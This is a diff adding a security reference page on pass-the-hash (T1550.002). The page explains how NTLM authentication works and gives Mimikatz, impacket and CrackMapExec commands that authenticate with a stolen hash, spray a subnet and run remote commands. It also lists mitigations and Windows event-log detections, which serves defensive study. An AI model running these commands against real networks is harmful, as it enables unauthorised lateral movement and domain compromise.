@@ -1,0 +1,173 @@
+---
+title: Pass-the-Hash
+mitre: T1550.002
+category: credential-access
+group: Lateral Movement
+summary: Authenticate to remote services using an NTLM hash directly, without cracking the plaintext password.
+platform: [Windows]
+tags: ['C / C++', 'Python', 'NTLM', 'Active Directory']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: obtain NTLM hash
+    desc: Extract from LSASS dump, NTDS.dit, or a relay attack — any valid NTLM hash works.
+    dll: —
+  - call: patch logon session credentials
+    desc: Tools like Mimikatz patch the current logon session in LSASS to hold the target hash.
+    dll: —
+  - call: authenticate to remote service
+    desc: The OS uses the patched hash for NTLM authentication to SMB, WinRM, RDP (NLA), or any NTLM-capable service.
+    dll: secur32 / netapi32
+  - call: execute / access resource
+    desc: PsExec-style execution, SMB share access, WMI command execution, etc.
+    dll: —
+detections:
+  - src: WINDOWS EID 4624
+    text: Logon type 3 (Network) with NtLmSsp authentication package from a workstation that doesn't normally admin-access the target.
+  - src: WINDOWS EID 4648
+    text: Explicit credential logon — Mimikatz's sekurlsa::pth creates a new logon session with type 9.
+  - src: NETWORK
+    text: NTLM authentication to a host where Kerberos should be preferred — NTLM on an AD domain is anomalous for domain accounts.
+  - src: BEHAVIOURAL
+    text: A workstation authenticating to dozens of hosts in a short window using the same account (lateral movement sweep).
+related:
+  - mitre: T1003.001
+    title: LSASS Memory Dump
+    desc: Primary source of hashes for pass-the-hash on current sessions.
+    href: /techniques/credential-access/lsass-memory-dump
+  - mitre: T1003.003
+    title: NTDS.dit Extraction
+    desc: Domain-wide hash source; enables pass-the-hash across the entire domain.
+    href: /techniques/credential-access/ntds-dit
+  - mitre: T1550.003
+    title: Pass-the-Ticket
+    desc: Kerberos equivalent — uses TGT or TGS tickets instead of hashes.
+labKit:
+  - label: impacket suite (wmiexec, smbexec, psexec)
+    href: 'https://github.com/fortra/impacket'
+  - label: CrackMapExec
+    href: 'https://github.com/byt3bl33d3r/CrackMapExec'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+NTLM authentication uses the NT hash of a password directly as the session key — the plaintext
+is never needed after the initial derivation. An attacker who obtains the NT hash can authenticate
+to any service that accepts NTLM without ever cracking the password. The hash is the credential.
+
+This has been known since 1997 and has never been patched, because it is a property of the NTLM
+protocol design. The fix is to disable NTLM entirely and enforce Kerberos, which requires the
+authenticating principal to prove knowledge of a secret derived differently.
+
+<Callout type="note">
+  Pass-the-hash with domain accounts works against any service that accepts NTLM, including SMB,
+  WinRM, RDP (with NLA), MSSQL, and HTTP with Windows Integrated Authentication. Local accounts
+  (non-domain) are more constrained: UAC remote restrictions (`LocalAccountTokenFilterPolicy`)
+  block admin shares for local accounts unless explicitly disabled.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Mimikatz (on-Windows)
+
+<CodeBlock
+  file="pth_mimikatz.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# sekurlsa::pth patches LSASS to inject the hash into a new logon session
+# Spawns a cmd.exe (or any binary) authenticated as the target account
+mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local \
+         /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe
+
+# The new cmd.exe window has Administrator's NTLM hash for all network auth
+# Use it for lateral movement:
+> dir \\\\dc01\\c$
+> psexec \\\\dc01 cmd.exe`}
+/>
+
+### impacket (Linux / remote)
+
+<CodeBlock
+  file="pth_impacket.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# All impacket tools accept LM:NT hash format (use aad3b435... as LM placeholder)
+HASH="aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
+
+# SMB exec (creates a service)
+$ python3 psexec.py corp.local/Administrator@192.168.1.10 -hashes $HASH
+
+# WMI exec (no service, less noise)
+$ python3 wmiexec.py corp.local/Administrator@192.168.1.10 -hashes $HASH
+
+# Spray across a subnet
+$ python3 smbclient.py corp.local/Administrator@192.168.1.0/24 \
+          -hashes $HASH -c 'dir'`}
+/>
+
+### CrackMapExec (spray + execute)
+
+<CodeBlock
+  file="pth_cme.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# Validate the hash against a list of targets
+$ crackmapexec smb 192.168.1.0/24 \
+    -u Administrator \
+    -H 8846f7eaee8fb117ad06bdd830b7586c \
+    --continue-on-success
+
+# Execute a command on all matching hosts
+$ crackmapexec smb 192.168.1.0/24 \
+    -u Administrator \
+    -H 8846f7eaee8fb117ad06bdd830b7586c \
+    -x "whoami /all"`}
+/>
+
+## Hash sources
+
+| Source technique | Scope | Noise level |
+|---|---|---|
+| LSASS dump | Currently logged-on users | High — handle to lsass |
+| NTDS.dit | All domain accounts | Very high — DC access + VSS |
+| NTLM relay | Any authenticated user at relay time | Medium — network-based |
+| Responder / LLMNR | Users querying broadcast names | Low — passive listener |
+| Token impersonation | Current session's logged-on accounts | Medium |
+
+## Mitigations
+
+| Control | Effectiveness |
+|---|---|
+| Disable NTLM domain-wide | Eliminates pass-the-hash for domain accounts |
+| Enable LAPS | Unique local admin passwords prevent reuse across hosts |
+| Tiered admin model | Limits blast radius — domain admin hashes not on workstations |
+| `LocalAccountTokenFilterPolicy = 0` (default) | Blocks PTH to admin shares using local accounts |
+| Protected Users group | Prevents NTLM auth for member accounts |
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+Logon type 9 (NewCredentials) in EID 4648 is the specific artifact of Mimikatz's `sekurlsa::pth`:
+it creates a new logon session with explicit credentials while the original session remains intact.
+Alerting on type 9 logons from non-expected admin workstations is high-fidelity.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
